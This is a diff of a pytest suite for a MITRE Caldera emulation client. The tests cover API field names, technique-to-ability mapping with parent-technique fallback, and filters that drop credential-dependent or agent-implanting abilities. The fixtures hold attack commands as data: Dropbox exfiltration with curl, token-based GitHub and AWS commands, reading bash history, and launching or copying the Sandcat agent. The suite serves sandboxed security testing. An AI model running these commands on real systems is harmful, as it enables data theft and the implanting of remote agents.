@@ -11,6 +11,7 @@ Cobertura obrigatória (Semana 10):
 from __future__ import annotations
 
 import inspect
+from unittest.mock import MagicMock
 
 import httpx
 import pytest
@@ -58,7 +59,7 @@ class TestHappyPath:
     @respx.mock
     def test_full_pipeline_returns_metrics(self):
         respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
-            return_value=httpx.Response(200, json={"id": "adv-1"})
+            return_value=httpx.Response(200, json={"adversary_id": "adv-1"})
         )
         respx.post(f"{_BASE_URL}/api/v2/operations").mock(
             return_value=httpx.Response(200, json={"id": "op-1"})
@@ -83,7 +84,8 @@ class TestHappyPath:
             mitre_techniques=["T1190", "T1059"],
         )
 
-        assert result["status"] == "ok"
+        # `status` responde "o Caldera respondeu?", nao "validou?".
+        assert result["status"] == "reachable"
         assert result["techniques_executed"] == 3
         assert result["techniques_successful"] == 2
         assert result["success_rate"] == pytest.approx(2 / 3)
@@ -93,7 +95,7 @@ class TestHappyPath:
     @respx.mock
     def test_zero_successful_yields_caldera_validated_false(self):
         respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
-            return_value=httpx.Response(200, json={"id": "adv-1"})
+            return_value=httpx.Response(200, json={"adversary_id": "adv-1"})
         )
         respx.post(f"{_BASE_URL}/api/v2/operations").mock(
             return_value=httpx.Response(200, json={"id": "op-1"})
@@ -111,14 +113,15 @@ class TestHappyPath:
         )
         client = _build_client()
         result = client.run_safe("x", ["T1190"])
-        assert result["status"] == "ok"
+        # `status` responde "o Caldera respondeu?", nao "validou?".
+        assert result["status"] == "reachable"
         assert result["caldera_validated"] is False
         assert result["success_rate"] == 0.0
 
     @respx.mock
     def test_create_adversary_payload(self):
         route = respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
-            return_value=httpx.Response(200, json={"id": "adv-9"})
+            return_value=httpx.Response(200, json={"adversary_id": "adv-9"})
         )
         client = _build_client()
         adv_id = client.create_adversary("my-adv", ["T1190"])
@@ -164,7 +167,7 @@ class TestTimeout:
     def test_run_safe_timeout_returns_status_failed(self):
         """Cenário obrigatório do checklist Semana 10."""
         respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
-            return_value=httpx.Response(200, json={"id": "adv-1"})
+            return_value=httpx.Response(200, json={"adversary_id": "adv-1"})
         )
         respx.post(f"{_BASE_URL}/api/v2/operations").mock(
             return_value=httpx.Response(200, json={"id": "op-stuck"})
@@ -202,7 +205,7 @@ class TestFaultIsolation:
     @respx.mock
     def test_run_operation_connection_error_yields_failed(self):
         respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
-            return_value=httpx.Response(200, json={"id": "adv-1"})
+            return_value=httpx.Response(200, json={"adversary_id": "adv-1"})
         )
         respx.post(f"{_BASE_URL}/api/v2/operations").mock(
             side_effect=httpx.ConnectError("Connection refused")
@@ -214,7 +217,7 @@ class TestFaultIsolation:
     @respx.mock
     def test_await_results_500_yields_failed(self):
         respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
-            return_value=httpx.Response(200, json={"id": "adv-1"})
+            return_value=httpx.Response(200, json={"adversary_id": "adv-1"})
         )
         respx.post(f"{_BASE_URL}/api/v2/operations").mock(
             return_value=httpx.Response(200, json={"id": "op-x"})
@@ -231,19 +234,92 @@ class TestFaultIsolation:
 # -----------------------------------------------------------------------------
 
 
-class TestMapToAbilitiesDebt:
-    def test_returns_empty_list_in_mvp(self):
-        client = _build_client()
-        assert client._map_to_abilities(["T1190", "T1059"]) == []
+def _resp(payload):
+    """Resposta httpx mínima para os testes de mapeamento."""
+    r = MagicMock()
+    r.json.return_value = payload
+    r.raise_for_status.return_value = None
+    return r
 
-    def test_debt_comment_documents_impact(self):
-        source = inspect.getsource(
-            mitre_caldera_client.CalderaClient._map_to_abilities
+
+class TestMapToAbilities:
+    """O stub que devolvia `[]` foi implementado.
+
+    Enquanto existiu, o adversário nascia sem nenhuma ability: a operação
+    terminava com cadeia vazia e `caldera_validated` era sempre False. Parecia
+    "emulação não encontrou nada" quando nada havia sido executado.
+
+    O formato foi validado contra o Caldera 5.0.0 real: a API v2 NÃO filtra por
+    técnica (`?technique_id=` responde 422), e o catálogo usa sub-técnicas
+    (`T1497.003`).
+    """
+
+    def _ability(self, ability_id: str, technique_id: str, plataforma: str = "linux"):
+        return {
+            "ability_id": ability_id,
+            "technique_id": technique_id,
+            "executors": [{"platform": plataforma, "command": "id"}],
+        }
+
+    def _com_catalogo(self, catalogo):
+        client = _build_client()
+        client.client.get = MagicMock(return_value=_resp(catalogo))
+        return client
+
+    def test_busca_o_catalogo_uma_vez_so(self):
+        """`?technique_id=` devolve 422 no Caldera real — filtro é local."""
+        client = self._com_catalogo(
+            [self._ability("a1", "T1059"), self._ability("a2", "T1082")]
         )
-        assert "DEBT" in source
-        assert "caldera_validated" in source
-        # Impacto observável documentado conforme decisão #2
-        assert "False" in source or "false" in source
+
+        assert client._map_to_abilities(["T1059", "T1082"]).abilities == ["a1", "a2"]
+        assert client.client.get.call_count == 1
+        assert client.client.get.call_args[0][0] == "/api/v2/abilities"
+
+    def test_tecnica_pai_casa_com_subtecnicas(self):
+        """Pedir `T1497` traz `T1497.003`; o catálogo real usa sub-técnicas."""
+        client = self._com_catalogo(
+            [self._ability("sub", "T1497.003"), self._ability("outra", "T1082")]
+        )
+
+        assert client._map_to_abilities(["T1497"]).abilities == ["sub"]
+
+    def test_subtecnica_exata_nao_traz_irmas(self):
+        client = self._com_catalogo(
+            [self._ability("a", "T1497.001"), self._ability("b", "T1497.003")]
+        )
+
+        assert client._map_to_abilities(["T1497.003"]).abilities == ["b"]
+
+    def test_ignora_ability_sem_executor_linux(self):
+        """O agente do sandbox roda Linux: ability de Windows vira link que
+        falha e derruba o `success_rate` por motivo alheio ao alvo."""
+        client = self._com_catalogo(
+            [
+                self._ability("win", "T1059", "windows"),
+                self._ability("lin", "T1059", "linux"),
+            ]
+        )
+
+        assert client._map_to_abilities(["T1059"]).abilities == ["lin"]
+
+    def test_tecnica_sem_correspondencia_devolve_vazio(self):
+        client = self._com_catalogo([self._ability("a1", "T1059")])
+
+        assert client._map_to_abilities(["T9999"]).abilities == []
+
+    def test_falha_ao_buscar_catalogo_nao_derruba(self):
+        client = _build_client()
+        client.client.get = MagicMock(side_effect=RuntimeError("boom"))
+
+        assert client._map_to_abilities(["T1059"]).abilities == []
+
+    def test_lista_vazia_nao_faz_requisicao(self):
+        client = _build_client()
+        client.client.get = MagicMock()
+
+        assert client._map_to_abilities([]).abilities == []
+        client.client.get.assert_not_called()
 
 
 # -----------------------------------------------------------------------------
@@ -264,3 +340,362 @@ class TestParseResults:
         client = _build_client()
         result = client._parse_results({"state": "finished"})
         assert result["techniques_executed"] == 0
+
+
+class TestContratoRealDaApiV2:
+    """Fixa os nomes de campo conferidos contra o Caldera 5.0.0 em execução.
+
+    Os testes antigos mockavam `{"id": ...}` para o adversário e por isso
+    **concordavam com o bug**: em produção o POST retornava 200 e o cliente
+    estourava `KeyError: 'id'`, que o `run_safe` traduzia para "Caldera
+    unavailable" — parecendo falha de conectividade numa chamada que funcionou.
+
+    A assimetria é real e fácil de reintroduzir:
+      - adversário → `adversary_id`
+      - operação   → `id`
+    """
+
+    @respx.mock
+    def test_create_adversary_le_adversary_id(self):
+        respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
+            return_value=httpx.Response(200, json={"adversary_id": "adv-real"})
+        )
+        assert _build_client().create_adversary("x", []) == "adv-real"
+
+    @respx.mock
+    def test_create_adversary_falha_alto_se_campo_sumir(self):
+        """Se a API mudar, é melhor estourar do que devolver id silenciosamente
+        errado — um id inválido faria a operação rodar sem adversário."""
+        respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
+            return_value=httpx.Response(200, json={"nome_inesperado": "x"})
+        )
+        with pytest.raises(KeyError):
+            _build_client().create_adversary("x", [])
+
+    @respx.mock
+    def test_operacao_referencia_o_adversario_por_adversary_id(self):
+        """O payload da operação também usa `adversary_id`; mandar `id` cria
+        uma operação sem adversário, que termina com cadeia vazia."""
+        rota = respx.post(f"{_BASE_URL}/api/v2/operations").mock(
+            return_value=httpx.Response(200, json={"id": "op-real"})
+        )
+
+        assert _build_client().run_operation("adv-real") == "op-real"
+
+        import json as _json
+
+        enviado = _json.loads(rota.calls[0].request.content)
+        assert enviado["adversary"] == {"adversary_id": "adv-real"}
+
+
+class TestExecutavelNoSandbox:
+    """Ability que exige credencial externa é descartada antes do adversário.
+
+    O sandbox é `internal: true` — sem rota para a internet, por desenho. As
+    abilities de exfiltração (Dropbox, GitHub, S3) exigem `dropbox.api.key`,
+    `github.access.token` e afins: o planner atômico não satisfaz nenhuma, não
+    gera elo e encerra a operação na hora. Foi exatamente o que aconteceu — 6
+    abilities mapeadas, 0 executadas — com o relatório dizendo só
+    `caldera_validated: false`, sem o motivo.
+    """
+
+    def _ability(self, ability_id, technique_id, command):
+        return {
+            "ability_id": ability_id,
+            "name": ability_id,
+            "technique_id": technique_id,
+            "executors": [{"platform": "linux", "command": command}],
+        }
+
+    def _mapear(self, catalogo, tecnicas):
+        client = _build_client()
+        client.client.get = MagicMock(return_value=_resp(catalogo))
+        return client._map_to_abilities(tecnicas).abilities
+
+    def test_descarta_exfiltracao_para_servico_externo(self):
+        catalogo = [
+            self._ability("exfil", "T1567", "curl -T x https://api.dropbox.com -H '#{dropbox.api.key}'"),
+            self._ability("enum", "T1567", "whoami; echo #{host.user.name}"),
+        ]
+        assert self._mapear(catalogo, ["T1567"]) == ["enum"]
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "gh auth login --with-token #{github.access.token}",
+            "aws s3 cp x s3://b --profile #{aws.secret}",
+            "echo #{servico.api.key}",
+            "mysql -p#{db.password}",
+        ],
+    )
+    def test_descarta_qualquer_credencial(self, command):
+        catalogo = [self._ability("cred", "T1005", command)]
+        assert self._mapear(catalogo, ["T1005"]) == []
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "whoami",
+            "ls #{host.dir.compress}",
+            "curl #{server}/file",
+            "find / -user #{host.user.name}",
+        ],
+    )
+    def test_mantem_ability_local(self, command):
+        """Facts que o agente ou o próprio Caldera fornecem seguem valendo."""
+        catalogo = [self._ability("local", "T1082", command)]
+        assert self._mapear(catalogo, ["T1082"]) == ["local"]
+
+
+class TestContagemDeAgentesDoGrupo:
+    """A operação roda cada ability em TODOS os agentes do grupo.
+
+    O serviço `caldera-agent` reiniciava e registrava um agente NOVO a cada vez
+    (PAW aleatório): chegou a 20 agentes `red` para um único container, o que
+    transformou 3 abilities em 44 elos — 20× a execução de técnica MITRE real e
+    um `success_rate` calculado sobre uma amostra que não corresponde a alvo
+    nenhum. O `-paw` fixo no compose resolve a causa; este log é o que torna a
+    recaída VISÍVEL, porque o número não aparecia em lugar algum.
+    """
+
+    @respx.mock
+    def test_run_operation_consulta_agentes_antes_de_criar(self):
+        agentes = respx.get(f"{_BASE_URL}/api/v2/agents").mock(
+            return_value=httpx.Response(
+                200, json=[{"paw": "aperia-sandbox", "group": "red", "trusted": True}]
+            )
+        )
+        respx.post(f"{_BASE_URL}/api/v2/operations").mock(
+            return_value=httpx.Response(200, json={"id": "op-1"})
+        )
+
+        assert _build_client().run_operation("adv-1") == "op-1"
+        assert agentes.called
+
+    @respx.mock
+    def test_conta_apenas_o_grupo_configurado(self, monkeypatch):
+        monkeypatch.setattr(settings, "CALDERA_AGENT_GROUP", "red")
+        respx.get(f"{_BASE_URL}/api/v2/agents").mock(
+            return_value=httpx.Response(
+                200,
+                json=[
+                    {"paw": "a", "group": "red", "trusted": True},
+                    {"paw": "b", "group": "red", "trusted": False},
+                    {"paw": "c", "group": "blue", "trusted": True},
+                ],
+            )
+        )
+        assert _build_client()._registrar_agentes_do_grupo("red") == 2
+
+    @respx.mock
+    def test_falha_na_contagem_nao_impede_a_operacao(self):
+        """Diagnóstico é best-effort — nunca pode derrubar o Tier 3."""
+        respx.get(f"{_BASE_URL}/api/v2/agents").mock(
+            side_effect=httpx.ConnectError("Connection refused")
+        )
+        respx.post(f"{_BASE_URL}/api/v2/operations").mock(
+            return_value=httpx.Response(200, json={"id": "op-2"})
+        )
+
+        cliente = _build_client()
+        assert cliente._registrar_agentes_do_grupo("red") is None
+        assert cliente.run_operation("adv-1") == "op-2"
+
+    @respx.mock
+    def test_resposta_malformada_nao_estoura(self):
+        respx.get(f"{_BASE_URL}/api/v2/agents").mock(
+            return_value=httpx.Response(200, json=["lixo", {"group": "red"}, None])
+        )
+        assert _build_client()._registrar_agentes_do_grupo("red") == 1
+
+
+class TestFallbackParaTecnicaPai:
+    """Fallback para a técnica-pai quando a sub-técnica não existe no catálogo.
+
+    Motivado por um scan real: o Tier 2 pediu `T1059.007`/`T1552.001` e o
+    catálogo do Caldera só tem `T1059.001/.002/.004` e `T1552.002/.003/.004`.
+    Sete técnicas viravam **zero** abilities — a emulação não rodava nada e o
+    relatório só dizia `caldera_validated: false`, sem o motivo.
+
+    O fallback recupera cobertura, mas o que ele encontra vale MENOS: emular
+    `T1059.001` (PowerShell) quando o achado é `T1059.007` (JavaScript) valida a
+    família, não o achado. Estes testes existem para garantir que essa distinção
+    não se perca — é ela que impede um "primo do seu problema" virar
+    `caldera_validated: true`.
+    """
+
+    def _ability(self, ability_id: str, technique_id: str):
+        return {
+            "ability_id": ability_id,
+            "technique_id": technique_id,
+            "executors": [{"platform": "linux", "command": "id"}],
+        }
+
+    def _com_catalogo(self, catalogo):
+        client = _build_client()
+        client.client.get = MagicMock(return_value=_resp(catalogo))
+        return client
+
+    def test_subtecnica_ausente_cai_para_o_pai_e_fica_marcada(self):
+        client = self._com_catalogo([self._ability("ps", "T1059.001")])
+
+        mapa = client._map_to_abilities(["T1059.007"])
+
+        assert mapa.abilities == ["ps"]
+        assert mapa.pedidas_por_pai == ["T1059.007"]
+        assert mapa.tids_por_pai == {"T1059.001"}
+        # Não pode contar como exato: é outra sub-técnica.
+        assert mapa.tids_exatos == set()
+
+    def test_casamento_exato_nao_vira_fallback(self):
+        """Havendo a sub-técnica pedida, o pai não é consultado."""
+        client = self._com_catalogo(
+            [self._ability("exata", "T1059.007"), self._ability("irma", "T1059.001")]
+        )
+
+        mapa = client._map_to_abilities(["T1059.007"])
+
+        assert mapa.abilities == ["exata"]
+        assert mapa.tids_exatos == {"T1059.007"}
+        assert mapa.pedidas_por_pai == []
+
+    def test_tecnica_sem_familia_no_catalogo_fica_sem_cobertura(self):
+        """`T1185` não tem nada da família — o fallback não inventa cobertura."""
+        client = self._com_catalogo([self._ability("outra", "T1059.001")])
+
+        mapa = client._map_to_abilities(["T1185"])
+
+        assert mapa.abilities == []
+        assert mapa.pedidas_sem_cobertura == ["T1185"]
+        assert mapa.pedidas_por_pai == []
+
+    def test_sucesso_apenas_por_fallback_nao_valida_o_achado(self):
+        """O coração da mudança: emulação da família não é validação."""
+        client = self._com_catalogo([self._ability("ps", "T1059.001")])
+        mapa = client._map_to_abilities(["T1059.007"])
+
+        resultado = client._parse_results(
+            {"chain": [{"status": 0, "ability": {"technique_id": "T1059.001"}}]}, mapa
+        )
+
+        assert resultado["techniques_successful"] == 1
+        assert resultado["success_rate"] == 1.0
+        assert resultado["caldera_validated"] is False
+        assert resultado["validacao_parcial"] is True
+        assert resultado["tecnicas_por_pai"] == ["T1059.007"]
+
+    def test_sucesso_em_tecnica_exata_valida_mesmo_com_fallback_na_cadeia(self):
+        """Um fallback na lista não contamina o que casou exatamente."""
+        client = self._com_catalogo(
+            [self._ability("exata", "T1552.002"), self._ability("ps", "T1059.001")]
+        )
+        mapa = client._map_to_abilities(["T1552.002", "T1059.007"])
+
+        resultado = client._parse_results(
+            {
+                "chain": [
+                    {"status": 0, "ability": {"technique_id": "T1552.002"}},
+                    {"status": 0, "ability": {"technique_id": "T1059.001"}},
+                ]
+            },
+            mapa,
+        )
+
+        assert resultado["caldera_validated"] is True
+        assert resultado["validacao_parcial"] is False
+
+
+class TestAbilityQueImplantaAgente:
+    """Abilities que iniciam outro agente do Caldera são descartadas.
+
+    Incidente real: o fallback de pai (`T1059.007` → `T1059`) trouxe
+    `T1059.004` — "Start 54ndc47", cujo comando é `nohup ./sandcat.go &`. Uma
+    operação executa cada ability em TODOS os agentes do grupo, então cada
+    execução criava um agente que entrava no grupo e recebia a mesma ability.
+    Resultado: 20 agentes, 43 elos, operação sem fim e timeout de 600s.
+
+    O filtro roda ANTES do de credencial, porque este é o que causa laço.
+    """
+
+    def _ability(self, ability_id, technique_id, comando="id", payloads=None):
+        return {
+            "ability_id": ability_id,
+            "name": ability_id,
+            "technique_id": technique_id,
+            "executors": [
+                {
+                    "platform": "linux",
+                    "command": comando,
+                    "payloads": payloads or [],
+                }
+            ],
+        }
+
+    def _com_catalogo(self, catalogo):
+        client = _build_client()
+        client.client.get = MagicMock(return_value=_resp(catalogo))
+        return client
+
+    def test_descarta_start_sandcat(self):
+        """O caso exato do incidente."""
+        client = self._com_catalogo(
+            [
+                self._ability(
+                    "start", "T1059.004",
+                    comando="nohup ./sandcat.go -server #{server} &",
+                    payloads=["sandcat.go"],
+                )
+            ]
+        )
+
+        mapa = client._map_to_abilities(["T1059.004"])
+
+        assert mapa.abilities == []
+        assert mapa.implantam_agente == 1
+
+    def test_descarta_por_payload_mesmo_com_comando_inocente(self):
+        """`Weak executable files` injeta o lançador em executáveis graváveis —
+        o comando não parece deploy, o payload entrega."""
+        client = self._com_catalogo(
+            [self._ability("weak", "T1574.010", comando="find / -perm -333",
+                           payloads=["sandcat.go"])]
+        )
+
+        assert client._map_to_abilities(["T1574.010"]).abilities == []
+
+    def test_descarta_pelo_apelido_54ndc47(self):
+        """O Stockpile escreve "sandcat" como `54ndc47` em vários lugares."""
+        client = self._com_catalogo(
+            [self._ability("copy", "T1570", comando="scp 54ndc47 host:/tmp")]
+        )
+
+        assert client._map_to_abilities(["T1570"]).abilities == []
+
+    def test_nao_descarta_ability_comum(self):
+        """A regra precisa ser estreita: 5 de 70 abilities linux no catálogo."""
+        client = self._com_catalogo(
+            [self._ability("hist", "T1552.003", comando="cat ~/.bash_history")]
+        )
+
+        mapa = client._map_to_abilities(["T1552.003"])
+
+        assert mapa.abilities == ["hist"]
+        assert mapa.implantam_agente == 0
+
+    def test_fallback_nao_resgata_cobertura_com_ability_de_implantacao(self):
+        """Se a única candidata do pai implanta agente, a técnica fica SEM
+        cobertura — e não coberta por algo que não deveria rodar."""
+        client = self._com_catalogo(
+            [
+                self._ability(
+                    "start", "T1059.004",
+                    comando="nohup ./sandcat.go &", payloads=["sandcat.go"],
+                )
+            ]
+        )
+
+        mapa = client._map_to_abilities(["T1059.007"])
+
+        assert mapa.abilities == []
+        assert mapa.pedidas_sem_cobertura == ["T1059.007"]
+        assert mapa.pedidas_por_pai == []
